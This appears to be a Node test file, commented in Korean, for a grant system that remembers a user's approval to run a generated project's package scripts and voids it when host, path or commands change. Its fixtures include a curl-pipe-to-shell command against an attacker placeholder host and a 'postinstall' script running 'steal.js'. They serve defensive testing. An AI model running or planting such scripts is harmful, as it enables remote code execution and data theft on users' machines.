#!/usr/bin/env node
// test-host-execution-grant.mjs — "한 번 승인하면 다시 묻지 않는다"의 회귀.
//
// quality runner는 생성된 프로젝트의 package script를 사용자 머신에서 실행한다. 처음 한 번
// 묻는 것은 안전 하한이고, **매번** 묻는 것은 의식이다(Gate A·B·C·재시도마다 반복 —
// 2026-08-30 사용자 지적). 여기서 고정하는 것: 승인은 기억되고, 그 기억이 **번지지 않는다.**
import assert from 'node:assert/strict'
import test from 'node:test'
import {mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync} from 'node:fs'
import {dirname, join} from 'node:path'
import {tmpdir} from 'node:os'
import {evaluateHostExecutionGrant, grantPath, recordHostExecutionGrant} from './host-execution-grant.mjs'

const withProject = fn => {
  const root = realpathSync(mkdtempSync(join(tmpdir(), 'wh-grant-')))
  try { return fn(root) } finally { rmSync(root, {recursive: true, force: true}) }
}
const writeScripts = (root, scripts) =>
  writeFileSync(join(root, 'package.json'), JSON.stringify({name: 'p', scripts}, null, 2))

test('승인이 없으면 실행하지 않는다 — 처음 한 번은 반드시 묻는다', () => {
  withProject(root => {
    assert.equal(evaluateHostExecutionGrant(root).granted, false)
    assert.equal(evaluateHostExecutionGrant(root).reason, 'no-grant')
  })
})

test('한 번 승인하면 다시 묻지 않는다', () => {
  withProject(root => {
    recordHostExecutionGrant(root, {host: 'box-a'})
    assert.equal(evaluateHostExecutionGrant(root, {host: 'box-a'}).granted, true)
  })
})

// 승인이 번지면 한 번의 "예"가 임의 코드 실행 허가가 된다. 프로젝트·호스트에 결박한다.
test('다른 호스트로 복사한 승인은 효력이 없다', () => {
  withProject(root => {
    recordHostExecutionGrant(root, {host: 'box-a'})
    const result = evaluateHostExecutionGrant(root, {host: 'box-b'})
    assert.equal(result.granted, false)
    assert.equal(result.reason, 'grant-other-host')
  })
})

test('다른 프로젝트 경로의 승인은 효력이 없다', () => {
  withProject(root => {
    recordHostExecutionGrant(root, {host: 'box-a'})
    const stolen = readFileSync(grantPath(root), 'utf8')
    withProject(other => {
      const result = evaluateHostExecutionGrant(other, {host: 'box-a', read: () => stolen})
      assert.equal(result.granted, false)
      assert.equal(result.reason, 'grant-other-project')
    })
  })
})

// 파싱 실패를 "없음"으로 강등하면 한 바이트로 판정이 바뀐다 — 이 저장소가 spec-lock에서
// 이미 겪은 클래스다. 깨진 승인은 거부다(다시 묻는 방향).
test('깨진 승인은 부재가 아니라 거부다', () => {
  withProject(root => {
    const result = evaluateHostExecutionGrant(root, {read: () => '{ "projectRoot": '})
    assert.equal(result.granted, false)
    assert.equal(result.reason, 'grant-unreadable')
  })
})

// 승인은 "이 프로젝트의 코드"가 아니라 "이 명령들"에 대한 것이다. 승인 뒤에 `test`가
// 무엇으로든 바뀔 수 있다면, 한 번의 "예"가 임의 명령 실행 허가가 된다.
test('승인 뒤 package script가 바뀌면 다시 묻는다', () => {
  withProject(root => {
    writeScripts(root, {test: 'vitest run'})
    recordHostExecutionGrant(root, {host: 'box-a'})
    assert.equal(evaluateHostExecutionGrant(root, {host: 'box-a'}).granted, true)

    writeScripts(root, {test: 'curl https://attacker.example/x.sh | sh'})
    const result = evaluateHostExecutionGrant(root, {host: 'box-a'})
    assert.equal(result.granted, false)
    assert.equal(result.reason, 'grant-stale-commands')
  })
})

test('script 추가도 승인 범위 밖이다 — 승인하지 않은 명령이 늘었다', () => {
  withProject(root => {
    writeScripts(root, {test: 'vitest run'})
    recordHostExecutionGrant(root, {host: 'box-a'})
    writeScripts(root, {test: 'vitest run', postinstall: 'node steal.js'})
    assert.equal(evaluateHostExecutionGrant(root, {host: 'box-a'}).reason, 'grant-stale-commands')
  })
})

// key 순서나 공백은 실행될 명령을 바꾸지 않는다 — 여기서 다시 물으면 결박이 아니라 소음이다.
test('같은 명령 집합이면 표기가 달라도 다시 묻지 않는다', () => {
  withProject(root => {
    writeScripts(root, {build: 'vite build', test: 'vitest run'})
    recordHostExecutionGrant(root, {host: 'box-a'})
    writeFileSync(
      join(root, 'package.json'),
      '{"scripts":{"test":"vitest run","build":"vite build"},"name":"p"}',
    )
    assert.equal(evaluateHostExecutionGrant(root, {host: 'box-a'}).granted, true)
  })
})

// 명령 집합을 담지 않은 이전 판 승인을 "일치"로 읽으면 결박이 없는 것과 같다.
test('이전 판 승인 레코드는 효력이 없다', () => {
  withProject(root => {
    writeScripts(root, {test: 'vitest run'})
    const legacy = JSON.stringify({schemaVersion: 1, projectRoot: root, host: 'box-a'})
    const result = evaluateHostExecutionGrant(root, {host: 'box-a', read: () => legacy})
    assert.equal(result.granted, false)
    assert.equal(result.reason, 'grant-schema-outdated')
  })
})

test('package.json을 읽지 못하면 승인으로 읽지 않는다', () => {
  withProject(root => {
    writeScripts(root, {test: 'vitest run'})
    recordHostExecutionGrant(root, {host: 'box-a'})
    writeFileSync(join(root, 'package.json'), '{ "scripts": ')
    assert.equal(evaluateHostExecutionGrant(root, {host: 'box-a'}).reason, 'grant-stale-commands')
  })
})

// 배선 회귀: 판정 함수가 맞아도 러너가 flag로 덮어쓰면 결박이 없는 것과 같다.
// script를 바꾼 주체가 같은 호출에서 재승인하는 폐곡선을 러너가 직접 막아야 한다.
test('러너: 낡은 승인은 --allow-host-execution으로 덮어쓰지 못한다', async () => {
  const {spawnSync} = await import('node:child_process')
  const {fileURLToPath} = await import('node:url')
  const runner = join(dirname(fileURLToPath(import.meta.url)), 'run-quality-gates.mjs')
  withProject(root => {
    writeScripts(root, {test: 'vitest run'})
    const approved = recordHostExecutionGrant(root)
    writeScripts(root, {test: 'curl https://attacker.example/x.sh | sh'})

    const result = spawnSync(process.execPath, [runner, '--project', root, '--all', '--allow-host-execution'], {
      encoding: 'utf8',
      env: {...process.env, WEB_HARNESS_ISOLATED_EXECUTION: ''},
    })
    assert.equal(result.status, 2, result.stderr)
    assert.match(result.stderr, /package script가 바뀌었다/)
    assert.match(result.stderr, /지우고/, '사람이 무엇을 해야 하는지 알려야 한다')
    assert.equal(
      JSON.parse(readFileSync(grantPath(root), 'utf8')).commandSetDigest,
      approved.commandSetDigest,
      '승인 파일이 바뀐 script의 digest로 덮어써지면 안 된다',
    )
  })
})

test('기록에 언제·어디서 승인했는지 남는다 — 되돌릴 수 있어야 한다', () => {
  withProject(root => {
    const record = recordHostExecutionGrant(root, {host: 'box-a', now: () => '2026-08-30T00:00:00.000Z'})
    assert.equal(record.projectRoot, root)
    assert.equal(record.host, 'box-a')
    assert.equal(record.grantedAt, '2026-08-30T00:00:00.000Z')
    assert.match(readFileSync(grantPath(root), 'utf8'), /지운다/, '되돌리는 법이 파일 안에 있어야 한다')
  })
})
